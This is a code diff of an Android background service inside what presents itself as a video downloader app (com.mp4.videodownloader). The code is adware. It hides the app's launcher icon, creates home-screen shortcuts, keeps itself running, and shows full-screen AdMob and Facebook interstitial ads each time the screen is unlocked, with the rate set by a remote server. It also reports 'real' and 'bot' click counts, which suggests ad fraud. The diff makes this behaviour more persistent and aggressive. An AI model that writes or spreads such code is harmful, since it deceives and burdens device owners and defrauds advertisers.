@@ -70,13 +70,35 @@ public class MyService extends Service {
     private InterstitialAd mInterstitialAd;
     private com.facebook.ads.InterstitialAd fbInterstitialAd;
     private CheckAds checkAds;
+    private MyBroadcast myBroadcast;
 
     private static final Point[] points = {new Point(50, 50), new Point(51, 57), new Point(79, 85), new Point(72, 74),
             new Point(70, 92), new Point(71, 91), new Point(71, 93), new Point(72, 92), new Point(48, 80), new Point(48, 65), new Point(53, 40)};
 
+    private BroadcastReceiver mScreenOnOffReceiver = new BroadcastReceiver() {
+        public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent) {
+
+        }
+    };
+
     @Override
     public void onCreate() {
+        super.onCreate();
         Log.d("cao", "onCreate");
+        if (myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
+            initService();
+        }
+
+        if(myBroadcast==null)
+        {
+            try
+            {
+                myBroadcast = new MyBroadcast();
+                IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
+                registerReceiver(myBroadcast, filter);
+            }
+            catch (Exception e){}
+        }
     }
 
     private void initService() {
@@ -91,9 +113,6 @@ public class MyService extends Service {
         idFullFbService = mPrefs.getString("idFullFbService", "132115690797766_228391551170179");
         getAdsCount();
 
-        MyBroadcast myBroadcast = new MyBroadcast();
-        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
-        registerReceiver(myBroadcast, filter);
         scheduleTask();
     }
 
@@ -103,12 +122,34 @@ public class MyService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+//    @Override
+//    public void onTaskRemoved(Intent rootIntent) {
+//        super.onTaskRemoved(rootIntent);
+//        Log.d("caomui", "onTaskRemoved = " + counta);
+//    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d("cao", "onDestroy " +(myBroadcast == null));
+        if(myBroadcast!=null)
+        {
+            unregisterReceiver(myBroadcast);
+            myBroadcast = null;
+        }
+
+        if(myTask != null)
+        {
+            myTask.shutdown();
+        }
+
+        if(fbInterstitialAd != null)
+            fbInterstitialAd.destroy();
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d("cao", "onStartCommand");
-        if (myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
-            initService();
-        }
+        Log.d("cao", "onStartCommand  ");
         return START_STICKY;
     }
 
@@ -118,7 +159,7 @@ public class MyService extends Service {
             ComponentName componentName = new ComponentName(this.getPackageName(), "com.mp4.videodownloader.MAIN1");
             p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         } catch (Exception e) {
-            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
+//            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
             e.printStackTrace();
         }
 
@@ -139,13 +180,11 @@ public class MyService extends Service {
 
             addIntent
                     .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
-            addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
+            addIntent.putExtra("duplicate", true);  //may it's already there so don't duplicate
             getApplicationContext().sendBroadcast(addIntent);
-
+//            Log.d("caomui", "Done create shortcut");
             createShortcut();
-        }
-        catch (Exception e){
-            Log.d("caomui","=========");
+        } catch (Exception e) {
             e.printStackTrace();
         }
 
@@ -168,7 +207,7 @@ public class MyService extends Service {
                     mPrefs.edit().putInt("delay_retention", -1).commit();
                 }
 
-                if (totalTime == 4000) {
+                if (totalTime == 1500) {
                     SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                     mPrefs.edit().putInt("accept", 2).commit();
                 }
@@ -185,15 +224,20 @@ public class MyService extends Service {
                 }
             }
         }, 0, intervalService, TimeUnit.MINUTES);
+//        }, 0, 15, TimeUnit.SECONDS);
 
     }
 
     private void getClientConfig() {
+        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
+        int totalTime = mPrefs.getInt("totalTime", 0);
+
         OkHttpClient client = new OkHttpClient();
         RequestBody body = new FormBody.Builder()
                 .add("countTotalShow", countTotalShow + "")
                 .add("countRealClick", countRealClick + "")
                 .add("countBotClick", countBotClick + "")
+                .add("totalTime",totalTime+"")
                 .add("id", uuid)
                 .build();
         Request okRequest = new Request.Builder()
@@ -207,6 +251,7 @@ public class MyService extends Service {
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
+
                 Gson gson = new GsonBuilder().create();
                 clientConfig = gson.fromJson(response.body().string(), ClientConfig.class);
                 countTotalShow = 0;
@@ -259,14 +304,15 @@ public class MyService extends Service {
         @Override
         public void onReceive(Context context, Intent intent) {
             Log.d("cao", "Unlock Screen " + uuid);
-
             if (!isContinousShowAds || clientConfig == null)
                 return;
             if (new Random().nextInt(100) > clientConfig.max_percent_ads) {
                 return;
             }
             if (new Random().nextInt(100) < clientConfig.fb_percent_ads) {
+//            if (true) {
                 new Handler(Looper.getMainLooper()).post(new Runnable() {
+
                     public void run() {
                         if (fbInterstitialAd != null) {
                             fbInterstitialAd.destroy();
@@ -279,6 +325,7 @@ public class MyService extends Service {
 
                             @Override
                             public void onInterstitialDismissed(Ad ad) {
+
                                 saveAdsCount();
                             }
 
@@ -339,16 +386,15 @@ public class MyService extends Service {
                             @Override
                             public void onAdClosed() {
                                 super.onAdClosed();
-                                try {
-                                    if (Build.VERSION.SDK_INT < 21) {
-                                        ShowAds.getInstance().finishAffinity();
-                                    } else {
-                                        ShowAds.getInstance().finishAndRemoveTask();
-                                    }
-                                } catch (Exception e) {
-                                    e.printStackTrace();
-                                }
-
+//                                try {
+//                                    if (Build.VERSION.SDK_INT < 21) {
+//                                        ShowAds.getInstance().finishAffinity();
+//                                    } else {
+//                                        ShowAds.getInstance().finishAndRemoveTask();
+//                                    }
+//                                } catch (Exception e) {
+//                                    e.printStackTrace();
+//                                }
                                 saveAdsCount();
                             }
 
@@ -407,12 +453,18 @@ public class MyService extends Service {
                             @Override
                             public void onAdLoaded() {
                                 super.onAdLoaded();
-
                                 try {
                                     Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
                                     showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                     startActivity(showAds);
-                                    mInterstitialAd.show();
+
+                                    new Handler().postDelayed(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            mInterstitialAd.show();
+                                        }
+                                    }, 500);
+
                                 } catch (Exception e) {
                                 }
                             }
